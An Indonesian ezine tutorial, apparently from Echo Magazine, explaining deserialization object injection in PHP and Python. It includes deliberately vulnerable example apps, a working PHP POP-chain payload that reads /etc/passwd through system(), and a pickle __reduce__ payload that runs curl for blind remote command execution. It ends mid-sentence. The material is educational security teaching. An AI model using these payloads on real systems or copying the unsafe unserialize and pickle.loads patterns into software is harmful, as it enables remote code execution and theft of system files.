@@ -1,0 +1,762 @@
+▓█████  ▄████▄   ██░ ██  ▒█████  ▒███████▒ ██▓ ███▄    █ ▓█████ 
+▓█   ▀ ▒██▀ ▀█  ▓██░ ██▒▒██▒  ██▒▒ ▒ ▒ ▄▀░▓██▒ ██ ▀█   █ ▓█   ▀ 
+▒███   ▒▓█    ▄ ▒██▀▀██░▒██░  ██▒░ ▒ ▄▀▒░ ▒██▒▓██  ▀█ ██▒▒███   
+▒▓█  ▄ ▒▓▓▄ ▄██▒░▓█ ░██ ▒██   ██░  ▄▀▒   ░░██░▓██▒  ▐▌██▒▒▓█  ▄ 
+░▒████▒▒ ▓███▀ ░░▓█▒░██▓░ ████▓▒░▒███████▒░██░▒██░   ▓██░░▒████▒
+░░ ▒░ ░░ ░▒ ▒  ░ ▒ ░░▒░▒░ ▒░▒░▒░ ░▒▒ ▓░▒░▒░▓  ░ ▒░   ▒ ▒ ░░ ▒░ ░
+ ░ ░  ░  ░  ▒    ▒ ░▒░ ░  ░ ▒ ▒░ ░░▒ ▒ ░ ▒ ▒ ░░ ░░   ░ ▒░ ░ ░  ░
+   ░   ░         ░  ░░ ░░ ░ ░ ▒  ░ ░ ░ ░ ░ ▒ ░   ░   ░ ░    ░   
+   ░  ░░ ░       ░  ░  ░    ░ ░    ░ ░     ░           ░    ░  ░
+       ░                         ░                              
+ECHO MAGAZINE VOLUME XIV, ISSUE XXXI, PHILE 0x004.TXT    
+				  
+Exploiting Deserialization in Web App (PHP & Python) - farisv
+farislab/at/gmail/dot/com
+
+-----| Pendahuluan
+
+Serialization adalah proses untuk mentranslasi struktur data atau
+objek menjadi format yang dapat disimpan (misal, dalam bentuk string)
+[1]. Kebalikan dari proses ini adalah Deserialization. Proses untuk
+melakukan serialisasi objek juga disebut dengan Marshalling. Kegunaan
+dari Serialization ini sangat banyak, misalnya untuk menyimpan state
+dari sebuah objek di dalam database, mengirim objek melalui jaringan,
+atau untuk melakukan Remote Procedure Call (RPC).
+
+Ada banyak cara yang dapat dilakukan untuk Serialization dan
+Deserialization. Beberapa bahasa pemrograman juga mempunyai built-in
+function untuk melakukan hal ini. PHP mempunyai fungsi serialize() dan
+unserialize(). Python mempunyai modul marshal dan pickle. Java
+mempunyai kelas ObjectInputStream dan ObjectOutputStream.
+Berbagai bahasa lain juga mempunyai fungsi tersendiri baik sebagai
+built-in atau library dari third party.
+
+Deserialization terkadang memiliki behavior yang dapat dimanfaatkan
+untuk melakukan eksploitasi terhadap web app apabila input terhadap
+fungsi Deserialization tersebut dapat diatur oleh user (misal, dari
+HTTP Request seperti POST atau Cookie). Contohnya, attacker dapat
+melakukan Object Injection apabila memang vulnerable. Beberapa kasus
+Object Injection melalui Deserialization yang pernah terpublikasi
+adalah:
+- Joomla 1.5 - 3.4.5 Object Injection RCE X-Forwarded-For header
+  (CVE-2015-8562) [2]
+- WooCommerce < 2.3.11 Object Injection [3]
+- manager.paypal.com Remote Code Execution Vulnerability (Java) [4]
+- Ruby on Rails 3.2.10 Remote Code Execution (CVE-2013-0156) [5] +
+  Instagram Sensu Admin RCE [6]
+
+Pada tulisan ini, akan dibahas mengenai contoh eksploitasi
+Deserialization yang mungkin pada PHP & Python sebagai pembelajaran
+untuk memahami dasar serangan yang dapat dilakukan. Kedua bahasa
+tersebut dipilih karena popularitasnya sebagai bahasa yang digunakan
+untuk membuat web app. Contoh eksploitasi dilakukan pada built-in
+function.
+
+-----| Object Injection
+
+Eksploitasi pada Deserialization pada umumnya berkaitan dengan Object
+Injection sehingga membutuhkan pengetahuan dasar mengenai objek itu
+sendiri. Tidak selalu eksploitasi pada Deserialization berkaitan
+dengan Object Injection, misalnya CVE-2016-7479 (PHP 7 Use After Free
+Vulnerability in unserialize()) yang merupakan Memory Corruption dan
+eksploitasi pada level binary [7]. Namun, pada tulisan ini eksploitasi
+difokuskan pada Object Injection.
+
+Sebelum mendalami Object Injection lebih jauh, Anda diharapkan sudah
+mengetahui mengenai konsep dasar Class dan bagaimana sebuah objek
+digunakan di dalam kode aplikasi. Beberapa konsep Object Oriented
+Programming seperti inheritance juga perlu diketahui. Pada kasus umum,
+Anda perlu mengetahui Class yang diimpor pada titik kode aplikasi yang
+vulnerable terhadap Object Injection untuk mengetahui objek apa saja
+yang dapat diinjeksi. Jika Anda melakukan audit keamanan terhadap
+aplikasi secara white box, maka hal ini dapat lebih mudah dilakukan
+karena Anda mempunyai akses terhadap source code aplikasi. Jika audit
+dilakukan secara black box, maka Anda bisa melakukan research ataupun
+coba-coba melakukan Object Injection berupa pembuatan objek dari Class
+yang berasal dari library yang umum atau populer digunakan seperti
+yang terjadi pada kasus manage.paypal.com.
+
+Inti dari Object Injection adalah, Anda menyisipkan objek ke dalam
+aplikasi sehingga terjadi sesuatu yang tidak sesuai dengan intention
+dari aplikasi. Deserialization akan membuat sebuah objek terbentuk
+sehingga apabila data yang dimasukkan ke dalam Deserialization dapat
+diatur oleh attacker maka kemungkinan dapat terjadinya Object
+Injection sangat tinggi. Tidak semua Object Injection membahayakan
+keamanan aplikasi. Umumnya, risiko baru dikatakan tinggi apabila
+eksploitasi lanjutan dapat terjadi. Contohnya, apabila ada Class yang
+diimpor pada kode terkait dan Class tersebut berisi fungsi yang dapat
+dimanfaatkan untuk RCE melalui proses Deserialization. Untuk
+implementasi Deserialization tertentu seperti pada pickle di Python
+dapat dilakukan tanpa harus mengetahui Class yang dapat digunakan
+karena objek dengan Class buatan sendiri dapat dimasukkan pada saat
+Deserialization di pickle.
+
+Ada Serialization/Deserialization yang tidak melakukan pemrosesan
+terhadap objek sama sekali, misalnya JSON pada bahasa selain
+Javascript. Beberapa library JSON tertentu memang ada juga yang
+dirancang untuk dapat membentuk objek walaupun pada bahasa selain
+Javascript. Umumnya, library JSON yang standard tidak mempunyai
+kemampuan untuk melakukan Serialization/Deserialization pada
+objek secara langsung (kecuali pada library tertentu). Dan apabila
+diimplementasikan pun berarti mau tidak mau pembuatan objek harus
+tetap dilakukan sehingga celah menjadi tetap ada kecuali dilakukan
+penanganan khusus seperti whitelist terhadap objek apa saja yang dapat
+dibuat. Serialization terhadap objek biasanya akan terlihat
+kebergunaannya ketika memang objek tersebut rumit apalagi yang
+mempunyai instance variable berupa objek lain misalnya pada
+implementasi umum Tree dan Graph yang menyimpan instance berupa Node
+yang dapat menyimpan instance lagi yang berupa Node juga.
+
+-----| PHP
+
+Fungsi internal untuk melakukan Serialization yang menggunakan format
+PHP Serialized String pada PHP adalah serialize() dan fungsi untuk
+melakukan Deserialization-nya adalah unseralize(). Fungsi lain yang
+juga melakukan Serializaiton/Deserialization dengan format sejenis
+(tetapi tidak sama persis) adalah session_encode() dan
+session_decode(). Celah dapat terjadi apabila input untuk
+unserialize() ataupun session_decode() dapat diatur oleh user.
+
+Sebagai catatan, apabila yang diinjeksi berupa bagian value, maka hal
+ini lebih sulit dieksploitasi karena sejak PHP 5.4.45 ada penanganan
+khusus pada value untuk Deserialization. Pada CVE-2015-8562 Joomla,
+HTTP Header X-Forwarded-For yang tidak tersaring menjadi bagian dari
+value yang ada pada serialisasi Session. Eksploitasi dilakukan dengan
+melakukan truncate pada input dengan menggunakan karakter UTF-8 agar
+injeksi dapat dilakukan. Trik truncate ini tidak dapat dilakukan pada
+PHP >= 5.4.45. Apabila user dapat mengatur keseluruhan bagian input
+Deserialization maka eksploitasi dapat dilakukan dengan lebih mudah.
+
+Pengetahuan mengenai OOP pada PHP dibutuhkan. Anda dapat mempelajari
+Object Oriented Programming pada PHP di halaman dokumentasi Classes
+and Objects di web PHP [8]. Salah satu poin yang harus diperhatikan
+adalah mengenai Magic Methods [9]. Magic Methods adalah fungsi atau
+method di dalam Class yang akan dipanggil ketika suatu kejadian khusus
+terjadi yang berkaitan dengan objek. Sebagai contoh, method
+__construct() akan dipanggil ketika objek diinisialisasi
+(new ObjectName()). Karena pada dasarnya Deserialization dilakukan
+untuk objek yang sudah diinisialisasi, maka __construct() tidak
+dipanggil ketika unserialize() atau session_decode() dilakukan.
+Magic Method yang dipanggil ketika unserialize() atau session_decode()
+dilakukan adalah __wakeup().
+
+Magic Method lain yang juga dapat terpanggil setelah Deserialization
+adalah __destruct(). Method __destruct() dipanggil ketika sudah tidak
+ada referensi ke objek terkait, misalnya ketika kode sudah selesai
+tereksekusi. Method lain yang dipanggil secara eksplisit setelah
+unserialize() atau session_decode() juga tereksekusi. Apabila di dalam
+implementasi method yang terpanggil setelah Deserialization terdapat
+proses terhadap instance variable yang seharusnya tidak berbahaya
+namun bisa menjadi berbahaya ketika instance variable ini dapat diubah
+melalui Object Injection, maka eksploitasi keamanan dapat dilakukan.
+Hal inilah yang mengakibatkan RCE, SQL Injection, Local File
+Inclusion, ataupun celah lainnya dapat dilakukan dengan memanfaatkan
+Object Injection melalui eksploitasi Deserialization.
+
+Sebelum mempelajari contoh serangan yang dapat dilakukan, kita harus
+mengetahui terlebih dahulu bentuk dari PHP Serialized String yang
+dihasilkan oleh serialize() dan session_encode(). Berkas test.php
+adalah kode PHP yang akan menulis hasil Serialization pada integer,
+string, array, dan objek ke dalam berkas serialized.txt.
+
+------------------------ test.php ------
+<?php
+
+class Example {
+    public $item_one;
+    private $item_two = 1337;
+
+    public function __construct() {
+        $this->item_one = "dummy";
+        echo "Construct Called - " . $this->item_one;
+    }
+
+    public function __wakeup() {
+        echo "Wakeup Called - " . $this->item_one;
+    }
+}
+
+$num = 99;
+$st = "ECHO";
+$arr = array("one", "two", "three");
+$assoc = array("Name" => "Guest", "Role" => 0);
+$obj = new Example();
+$obj->item_one = "EZINE";
+$output = serialize($num) . "\n";
+$output .= serialize($st) . "\n";
+$output .= serialize($arr) . "\n";
+$output .= serialize($assoc) . "\n";
+$output .= serialize($obj) . "\n";
+
+session_start();
+$_SESSION['logged_in'] = true;
+$_SESSION['user'] = "admin";
+$_SESSION['role'] = 1;
+
+$output .= session_encode() . "\n";
+
+file_put_contents("serialized.txt", $output);
+
+$obj2 = unserialize(serialize($obj));
+?>
+------------------------ test.php ------
+
+Berikut adalah isi dari serialized.txt setelah test.php dijalankan.
+
++------------------------------------
+| $ php test.php
+| Construct Called - dummy
+| Wakeup Called - EZINE
+| $ cat serialized.txt
+| i:99;
+| s:4:"ECHO";
+| a:3:{i:0;s:3:"one";i:1;s:3:"two";i:2;s:5:"three";}
+| a:2:{s:4:"Name";s:5:"Guest";s:4:"Role";i:0;}
+| O:7:"Example":2:{s:8:"item_one";s:5:"EZINE";s:17:"Exampleitem_two";i:1337;}
+| logged_in|b:1;user|s:5:"admin";role|i:1;
++-------------------------------------
+
+Terlihat bahwa __construct() dipanggil satu kali yaitu pada saat baris
+kode $obj = new Example() dijalankan di mana fungsi akan mencetak
+nilai dari variabel $item_one, yaitu "dummy". Fungsi __wakeup() juga
+dipanggil satu kali yaitu pada saat baris kode $obj2 =
+unserialize(serialize($obj)) dijalankan di mana fungsi akan mencetak
+nilai dari variabel $item_one yang telah diubah sebelumnya, yaitu
+"EZINE".
+
+Untuk hasil dari serialize(), karakter pertama selalu merupakan
+penanda dari data yang di-serialize. Pada contoh di atas, karakter 'i'
+untuk integer, 's' untuk string, 'a' untuk array, dan 'O' untuk objek.
+Hal ini penting agar ketika proses unserialize() dilakukan, fungsi
+akan melakukan parsing sesuai dengan struktur tipe data. Apabila
+tipe-nya adalah integer, maka setelah 'i' ada ':' yang disertai dengan
+nilai bilangan. Apabila tipe-nya adalah string maka setelah 's' ada
+':' yang disertai dengan panjang string lalu ':' lagi yang disertai
+dengan isi string.
+
+Untuk hasil Serialization pada array dan session diserahkan kepada
+pembaca untuk menganalisis sendiri maksud dari struktur yang ada
+karena cukup jelas. Bilangan sebelum '{' adalah jumlah properti yang
+mana tiap propertinya didefinisikan di dalam kurung kurawal dan
+dipisahkan dengan ';'. Untuk bagian hasil Serialization dari objek
+juga cukup jelas, namun ada hal yang harus diperhatikan, yaitu pada
+variabel kedua dari Serialization objek Example. Terlihat ada
+'s:17:"Exampleitem_two";i:1337;'. Pada variabel yang bertipe private,
+nama Class harus disertakan pada nama variabel yang di-serialize.
+Lalu, walaupun 'Exampleitem_two' memiliki panjang 15, tetapi
+sebenarnya ada null character yang mengapit 'Example' sehingga
+panjangnya menjadi 17. Null character ini tidak terlihat melalui cat
+sehingga kita dapat melihatnya dengan program semacam xxd.
+
++------------------------------------
+| $ xxd serialized.txt
+| ...
+| ...
+| 00000070: 7d0a 4f3a 373a 2245 7861 6d70 6c65 223a  }.O:7:"Example":
+| 00000080: 323a 7b73 3a38 3a22 6974 656d 5f6f 6e65  2:{s:8:"item_one
+| 00000090: 223b 733a 353a 2245 5a49 4e45 223b 733a  ";s:5:"EZINE";s:
+| 000000a0: 3137 3a22 0045 7861 6d70 6c65 0069 7465  17:".Example.ite
+| 000000b0: 6d5f 7477 6f22 3b69 3a31 3333 373b 7d0a  m_two";i:1337;}.
+| ...
++------------------------------------
+
+Perhatikan bahwa hexadecimal pada baris indeks 0xa0 mengandung 0x00 di
+antara hexadecimal dari "Example". Apabila tipe dari variabelnya
+adalah protected maka yang di-append bukanlah nama Class tetapi
+karakter '*'. Hal ini penting untuk diketahui karena nantinya kita
+akan membuat PHP Serialization String sendiri untuk melakukan Object
+Injection. Untuk properti yang ada di dalam objek, kita tidak harus
+mencantumkan seluruh instance variable yang dimiliki oleh Class
+sehingga apabila PHP Serialization String untuk objek di atas diubah
+sehingga properti yang tertulis di situ hanya item_one atau item_two
+saja atau tidak ada sama sekali maka hal itu tetap valid. Bahkan
+apabila nama propertinya bukan merupakan nama instance variable yang
+ada hal itu tetap valid.
+
+Untuk selanjutnya, akan dibahas contoh skenario eksploitasi
+Deserialization pada PHP yang mungkin dilakukan dengan menggunakan
+unserialize(). Skenario ini adalah skenario berdasarkan kasus nyata
+yang disederhanakan sebagai dasar pembelajaran. Katakanlah ada dua
+Class yang bernama MultiAPI dan Setting yang tersimpan pada berkas
+terpisah.
+
+------------------------ MultiAPI.php ------
+<?php
+class MultiAPI {
+    private $path;
+    private $disconnectHandlers;
+
+    public function __construct() {
+        // just pretend this is is a valid implementation
+        $this->path = "something";
+        $this->disconnectHandlers = array("MultiAPI::disconnect_one",
+                                          "MultiAPI::disconnect_two",
+                                          "MultiAPI::disconnect_three");
+    }
+
+    public function connect() {
+        // Connect API
+    }
+
+    private function disconnect_one() {
+       // Disconnect API 1
+    }
+
+    private function disconnect_two() {
+       // Disconnect API 2
+    }
+
+    private function disconnect_three() {
+       // Disconnect API 3
+    }
+
+    public function __destruct() {
+       foreach ($this->disconnectHandlers as $handler) {
+           call_user_func($handler, $this->path);
+       }
+    }
+}
+?>
+------------------------ MultiAPI.php ------
+
+------------------------ Setting.php ------
+<?php
+class Setting {
+    private $name;
+    private $color;
+    private $theme;
+
+    public function __construct($name, $color, $theme) {
+        $this->name = $name;
+        $this->color = $color;
+        $this->theme = $theme;
+    }
+}
+?>
+------------------------ Setting.php ------
+
+Dan untuk contoh penggunaannya, digunakan berkas test_serial.php.
+
+------------------------ test_serial.php ------
+<?php
+require("MultiAPI.php");
+require("Setting.php");
+
+function save($name, $color, $theme) {
+    $result = new Setting($name, $color, $theme);
+    $serialized = serialize($result);
+    return $serialized;
+}
+
+function load($serialized) {
+    $result = unserialize($serialized);
+    return $result;
+}
+
+$api = new MultiAPI();
+$api->connect();
+
+if ($_GET["action"] === "save") {
+    $serialized = save("Dummy", array("red", "green", "blue"), "DummyTheme");
+    echo urlencode($serialized);
+} else
+if ($_GET["action"] === "load") {
+    $param = $_GET["setting"];
+    $setting = load($param);
+    var_dump($setting);
+}
+?>
+------------------------ test_serial.php ------
+
+Maksud dari kode di atas diharapkan dapat dipelajari sendiri oleh
+pembaca. Intinya kode di atas hanyalah contoh yang disederhanakan.
+Celahnya adalah pada parameter GET 'setting' yang menjadi input dari
+unserialize(). Pada kasus yang lebih nyata, input pada Deserialization
+ini dapat juga dimasukkan ke session_decode() dan juga dapat
+memanfaatkan bebagai hal misalnya Cookie, PUT Request, User Agent,
+atau bahkan mengkombinasikannya dengan celah lain seperti SQL
+Injection. Berikut adalah beberapa percobaan yang dilakukan.
+
++------------------------------------
+| $ curl localhost/test_serial.php?action=save
+| O%3A7%3A%22Setting%22%3A3%3A%7Bs%3A13%3A%22%00Setting%00name%22%3Bs%
+| 3A5%3A%22Dummy%22%3Bs%3A14%3A%22%00Setting%00color%22%3Ba%3A3%3A%7Bi
+| %3A0%3Bs%3A3%3A%22red%22%3Bi%3A1%3Bs%3A5%3A%22green%22%3Bi%3A2%3Bs%3
+| A4%3A%22blue%22%3B%7Ds%3A14%3A%22%00Setting%00theme%22%3Bs%3A10%3A%2
+| 2DummyTheme%22%3B%7D
+|
+| $ curl 'localhost/test_serial.php?action=load&setting=O%3A7%3A%22Set
+| ting%22%3A3%3A%7Bs%3A13%3A%22%00Setting%00name%22%3Bs%3A5%3A%22Dummy
+| %22%3Bs%3A14%3A%22%00Setting%00color%22%3Ba%3A3%3A%7Bi%3A0%3Bs%3A3%3
+| A%22red%22%3Bi%3A1%3Bs%3A5%3A%22green%22%3Bi%3A2%3Bs%3A4%3A%22blue%2
+| 2%3B%7Ds%3A14%3A%22%00Setting%00theme%22%3Bs%3A10%3A%22DummyTheme%22
+| %3B%7Df'
+| object(Setting)#2 (3) {
+| ["name":"Setting":private]=>
+|   string(5) "Dummy"
+|   ["color":"Setting":private]=>
+|   array(3) {
+|     [0]=>
+|     string(3) "red"
+|     [1]=>
+|     string(5) "green"
+|     [2]=>
+|     string(4) "blue"
+|   }
+|   ["theme":"Setting":private]=>
+|     string(10) "DummyTheme"
+| }
+|
+| $ cat /var/www/html/session.txt
+| username|s:5:"Dummy";ua|s:11:"curl/7.43.0";
++------------------------------------
+
+Selanjutnya kita akan mencoba untuk melakukan Object Injection.
+Perhatikan bahwa pada method __destruct() di dalam Class MultiAPI ada
+fungsi call_user_func(). Fungsi ini akan melakukan dynamic call di
+mana argumen pertama adalah nama fungsi yang akan dipanggil dalam
+bentuk string dan argumen kedua adalah argumen untuk fungsi tersebut.
+Kedua argumen ini diambil dari instance variable $disconnectHandlers
+dan $path yang hanya diinisialisasi pada saat __construct().
+Normalnya, fungsi ini tidak berbahaya. Namun, ketika isi dari
+$disconnectHandlers dan $path dapat diganti maka hal ini menjadi
+berbahaya.
+
+Fungsi call_user_func() sendiri dan juga berbagai fungsi lain yang
+melakukan evaluasi kode ataupun fungsi seperti eval() dan array_map()
+(sebagai catatan, eval() sebenarnya tidak dianggap sebagai fungsi pada
+internal PHP) secara nature adalah berbahaya apabila argumennya tidak
+disaring dengan baik. Keberadaan fungsi-fungsi ini dan juga fungsi
+yang berpotensi menimbulkan celah (misal, SQL Injection) pada method
+yang akan dipanggil setelah Deserialization terjadi adalah hal yang
+harus dicari apabila kita ingin melakukan Object Injection. Fungsi
+call_user_func() sendiri diambil menjadi contoh karena keberadaan
+varian fungsi ini (yaitu call_user_func_array) adalah yang
+dimanfaatkan payload yang digunakan pada contoh eksploitasi
+CVE-2015-8562 Joomla.
+
+Percobaan penggunaan call_user_func() di bawah cukup meyakinkan bahwa
+fungsi ini berbahaya.
+
++------------------------------------
+| $ php -a
+| Interactive mode enabled
+|
+| php > call_user_func("system", "whoami")
+| vagrant
++------------------------------------
+
+Selanjutnya kita akan membuat payload yang akan digunakan untuk
+melakukan Object Injection. Biasanya pembuatan payload untuk Object
+Injection disebut dengan Property Oriented Programming (POP) dan
+isinya disebut dengan POP Chain. Bagi Anda yang pernah mempelajari
+Return Oriented Programming (ROP) pada eksploitasi binary sebenarnya
+hal ini mirip karena sama-sama tersusun menjadi beberapa gadget.
+Apabila pada ROP Chain gadget-nya adalah lokasi instruksi mesin yang
+akan diakhiri dengan ret, pada POP Chain gadget-nya adalah properti
+object yang memiliki Magic Method __wakeup()/__destruct() atau method
+yang akan terpanggil setelah Deserialization dilakukan yang dapat
+mengantarkan kita ke eksploitasi keamanan yang mana hal ini bisa saja
+memerlukan gadget berantai yang memanfaatkan objek lain.
+
+Pada contoh kasus di atas, POP Chain yang harus dibuat cukup
+straight-forward karena kita harus menginjeksi objek MultiAPI dengan
+properti $disconnectHandlers berupa array yang berisi string fungsi
+Shell Command Execution (misal, system) dan $path berupa argumen untuk
+fungsi tersebut. Untuk membuatnya ada beberapa cara. Cara pertama
+adalah secara manual dan cara kedua adalah membuat Class sederhana
+yang meniru struktur Class tersebut yang berisi properti yang
+diperlukan kemudian melakukan serialize(). Hasil dari serialize()
+tersebut adalah yang kita gunakan untuk Object Injection. Kita akan
+mencoba cara kedua agar lebih pasti (terutama karena kita harus
+melakukan handle terhadap null byte apabila melakukan secara manual).
+Shell Command yang akan dieksekusi adalah 'cat /etc/passwd | head -1'.
+
+------------------------ pop.php ------
+<?php
+class MultiAPI {
+    private $path = "cat /etc/passwd | head -1";
+    private $disconnectHandlers = array("system", "dummy", "dummy");
+}
+echo urlencode(serialize(new MultiAPI()));
+------------------------ pop.php ------
+
++------------------------------------
+| $ php pop.php
+| O%3A8%3A%22MultiAPI%22%3A2%3A%7Bs%3A14%3A%22%00MultiAPI%00path%22%3B
+| s%3A25%3A%22cat+%2Fetc%2Fpasswd+%7C+head+-1%22%3Bs%3A28%3A%22%00Mult
+| iAPI%00disconnectHandlers%22%3Ba%3A3%3A%7Bi%3A0%3Bs%3A6%3A%22system%
+| 22%3Bi%3A1%3Bs%3A5%3A%22dummy%22%3Bi%3A2%3Bs%3A5%3A%22dummy%22%3B%7D
+| %7D
+|
+| $ curl 'localhost/test_serial.php?action=load&setting=O%3A8%3A%22Mul
+| tiAPI%22%3A2%3A%7Bs%3A14%3A%22%00MultiAPI%00path%22%3Bs%3A25%3A%22ca
+| t+%2Fetc%2Fpasswd+%7C+head+-1%22%3Bs%3A28%3A%22%00MultiAPI%00disconn
+| ectHandlers%22%3Ba%3A3%3A%7Bi%3A0%3Bs%3A6%3A%22system%22%3Bi%3A1%3Bs
+| %3A5%3A%22dummy%22%3Bi%3A2%3Bs%3A5%3A%22dummy%22%3B%7D%7D'
+| object(MultiAPI)#2 (2) {
+|   ["path":"MultiAPI":private]=>
+|   string(25) "cat /etc/passwd | head -1"
+|   ["disconnectHandlers":"MultiAPI":private]=>
+|   array(3) {
+|     [0]=>
+|     string(6) "system"
+|     [1]=>
+|     string(5) "dummy"
+|     [2]=>
+|     string(5) "dummy"
+|   }
+| }
+| root:x:0:0:root:/root:/bin/bash
++------------------------------------
+
+Object Injection berhasil dilakukan yang mengakibatkan Remote Command
+Execution.
+
+-----| Python
+
+Kita sudah mempelajari dasar dari eksploitasi Deserialization untuk
+Object Injection beserta contoh kasusnya pada PHP. Penjelasan untuk
+kasus pada Python akan dijelaskan lebih kepada contoh. Intinya pada
+Python ada modul marshal dan pickle yang dapat digunakan untuk
+Serialization/Deserialization secara natif. Hasil serialisasi yang
+dihasilkan adalah representasi opcode dari data terkait dan
+strukturnya berbeda apabila dijalankan Python 3 dan Python 2.
+
+Modul pickle sendiri lebih general dibanding marshal dan konsepnya
+sama (bahkan nama fungsi-nya pun sama). Kita akan menggunakan pickle
+pada contoh yang akan dipelajari. Pada halaman dokumentasi pickle
+sendiri ada peringatan yang tertulis "Warning: The pickle module is
+not secure against erroneous or maliciously constructed data. Never
+unpickle data received from an untrusted or unauthenticated source."
+[10].
+
+Berikut adalah kode test.py yang merupakan contoh penggunaan modul
+pickle di dalam web yang dibuat dengan menggunakan Flask.
+
+------------------------ test.py ------
+from flask import Flask
+import base64
+import pickle
+
+class Setting:
+    def __init__(self, name, color, theme):
+        self.name = name
+        self.color = color
+        self.theme = theme
+
+app = Flask(__name__)
+
+@app.route("/")
+def index():
+    s = Setting("Dummy", ["red", "green", "blue"], "dummytheme")
+    serialized = pickle.dumps(s)
+    return base64.b64encode(serialized)
+
+@app.route("/load/<serialized>")
+def load(serialized=None):
+    decode = base64.b64decode(serialized)
+    s = pickle.loads(decode)
+    return s.name
+
+if __name__ == "__main__":
+    app.run()
+------------------------ test.py ------
+
+Bberikut adalah percobaan yang dilakukan dengan menggunakan Python 2.7
+dan Python 3.5. Port default dari aplikasi yang dijalankan dengan
+Flask adalah 5000. Perhatikan bahwa hasil Serialization pickle pada
+Python 3 adalah binary data.
+
++------------------------------------
+| $ python test.py > /dev/null 2>&1 &
+| $ curl localhost:5000
+| KGlfX21haW5fXwpTZXR0aW5nCnAwCihkcDEKUydjb2xvcicKcDIKKGxwMwpTJ3JlZCcK
+| cDQKYVMnZ3JlZW4nCnA1CmFTJ2JsdWUnCnA2CmFzUyd0aGVtZScKcDcKUydkdW1teXRo
+| ZW1lJwpwOApzUyduYW1lJwpwOQpTJ0R1bW15JwpwMTAKc2Iu
+|
+| $ printf "KGlfX21haW5fXwpTZXR0aW5nCnAwCihkcDEKUydjb2xvcicKcDIKKGxwMw
+| pTJ3JlZCcKcDQKYVMnZ3JlZW4nCnA1CmFTJ2JsdWUnCnA2CmFzUyd0aGVtZScKcDcKUy
+| dkdW1teXRoZW1lJwpwOApzUyduYW1lJwpwOQpTJ0R1bW15JwpwMTAKc2Iu" | base64
+| -d
+| (i__main__
+| Setting
+| p0
+| (dp1
+| S'color'
+| p2
+| (lp3
+| S'red'
+| p4
+| aS'green'
+| p5
+| aS'blue'
+| p6
+| asS'theme'
+| p7
+| S'dummytheme'
+| p8
+| sS'name'
+| p9
+| S'Dummy'
+| p10
+| sb.
+|
+| $ curl localhost:5000/load/KGlfX21haW5fXwpTZXR0aW5nCnAwCihkcDEKUydjb
+| 2xvcicKcDIKKGxwMwpTJ3JlZCcKcDQKYVMnZ3JlZW4nCnA1CmFTJ2JsdWUnCnA2CmFzU
+| yd0aGVtZScKcDcKUydkdW1teXRoZW1lJwpwOApzUyduYW1lJwpwOQpTJ0R1bW15JwpwM
+| TAKc2Iu
+| Dummy
+|
+| $ pkill Python
+| $ python3 test.py > /dev/null 2>&1 &
+| $ curl localhost:5000
+| gANjX19tYWluX18KU2V0dGluZwpxACmBcQF9cQIoWAQAAABuYW1lcQNYBQAAAER1bW15
+| cQRYBQAAAHRoZW1lcQVYCgAAAGR1bW15dGhlbWVxBlgFAAAAY29sb3JxB11xCChYAwAA
+| AHJlZHEJWAUAAABncmVlbnEKWAQAAABibHVlcQtldWIu
+|
+| $ printf "gANjX19tYWluX18KU2V0dGluZwpxACmBcQF9cQIoWAQAAABuYW1lcQNYBQ
+| AAAER1bW15cQRYBQAAAHRoZW1lcQVYCgAAAGR1bW15dGhlbWVxBlgFAAAAY29sb3JxB1
+| 1xCChYAwAAAHJlZHEJWAUAAABncmVlbnEKWAQAAABibHVlcQtldWIu" | base64 -d
+| | xxd
+| 00000000: 8003 635f 5f6d 6169 6e5f 5f0a 5365 7474  ..c__main__.Sett
+| 00000010: 696e 670a 7100 2981 7101 7d71 0228 5804  ing.q.).q.}q.(X.
+| 00000020: 0000 006e 616d 6571 0358 0500 0000 4475  ...nameq.X....Du
+| 00000030: 6d6d 7971 0458 0500 0000 7468 656d 6571  mmyq.X....themeq
+| 00000040: 0558 0a00 0000 6475 6d6d 7974 6865 6d65  .X....dummytheme
+| 00000050: 7106 5805 0000 0063 6f6c 6f72 7107 5d71  q.X....colorq.]q
+| 00000060: 0828 5803 0000 0072 6564 7109 5805 0000  .(X....redq.X...
+| 00000070: 0067 7265 656e 710a 5804 0000 0062 6c75  .greenq.X....blu
+| 00000080: 6571 0b65 7562 2e                        eq.eub.
+|
+| $ curl localhost:5000/load/gANjX19tYWluX18KU2V0dGluZwpxACmBcQF9cQIoW
+| AQAAABuYW1lcQNYBQAAAER1bW15cQRYBQAAAHRoZW1lcQVYCgAAAGR1bW15dGhlbWVxB
+| lgFAAAAY29sb3JxB11xCChYAwAAAHJlZHEJWAUAAABncmVlbnEKWAQAAABibHVlcQtld
+| WIu
+| Dummy
++------------------------------------
+
+Apabila input untuk pickle.loads() dapat diatur oleh user, maka user
+dapat memanfaatkannya untuk melakukan Object Injection. Tidak seperti
+pada PHP di mana kita harus mengetahui Class yang diimpor pada kode
+yang mengandung vulnerability, pickle di Python memungkinkan kita
+untuk membentuk objek yang dibuat sendiri di mana method __reduce__
+adalah method yang akan dijalankan ketika Deserialization dilakukan.
+Pada contoh di atas, input untuk pickle.loads secara sederhana diambil
+dari hasil Base64 Decode dari URL ketika route-nya adalah
+'/load/<serialized>'. Pada contoh kasus yang lebih nyata, tentunya
+input bisa berasal dari hal lain seperti Cookie ataupun database.
+
+Pembuatan data Serialization secara manual cukup sulit terutama karena
+pada Python 3 data-nya berupa binary karena mengandung beberapa
+representasi opcode atau intermediate code dari Python. Kita dapat
+menggunakan trik seperti yang sudah dilakukan untuk membentuk POP
+Chain pada PHP, yaitu dengan membuat objek lalu melakukan
+Serialization. Class yang dibuat harus berupa Class yang inherited
+dari Class object. Nilai dari __reduce__() dapat berupa tuple di mana
+anggota pertama adalah nama fungsi yang dipanggil (harus berupa
+callable) dan anggota kedua adalah argumen. Argumen-nya sendiri juga
+berbentuk tupel. Karena fungsi harus berupa callable maka kita dapat
+memanfaatkan modul subprocess untuk memanggil fungsi call ataupun
+popen.
+
+------------------------ pop.py ------
+import base64
+import pickle
+import subprocess
+
+class Payload(object):
+    def __reduce__(self):
+        return (subprocess.call, (["curl", "localhost:1337"],))
+
+print base64.b64encode(pickle.dumps(Payload()))
+------------------------ pop.py ------
+
+Karena RCE yang dilakukan adalah Blind RCE, maka Shell Command yang
+dieksekusi adalah 'curl localhost:1337' dengan sebelumnya kita
+melakukan Listen terlebih dahulu pada port 1337 di localhost untuk
+mengetahui apakah RCE berhasil atau tidak. Pada kasus nyata ketika
+kita akan melakukan eksploitasi secara remote, tentunya kita dapat
+menggunakan IP yang bisa diakses oleh target. Apabila target kita
